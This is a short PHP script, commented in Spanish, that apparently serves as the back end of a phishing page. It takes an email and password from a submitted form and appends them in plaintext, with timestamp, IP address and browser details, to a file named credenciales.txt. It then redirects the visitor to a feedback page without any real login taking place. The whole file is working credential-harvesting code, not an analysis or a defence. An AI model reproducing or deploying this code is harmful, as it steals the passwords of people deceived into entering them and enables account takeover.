<?php
// Función para obtener la IP real del usuario
function getRealUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];
$ip = getRealUserIP();
$fecha = date('d/m/Y H:i:s');
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Guardar en formato: fecha|ip|navegador|email|password
$datos = "$fecha|$ip|$user_agent|$email|$password\n";

// Escribir en el archivo (modo seguro)
$archivo = 'credenciales.txt';
file_put_contents($archivo, $datos, FILE_APPEND | LOCK_EX);

// Redirigir al feedback
header("Location: feedback.html");
exit();
?>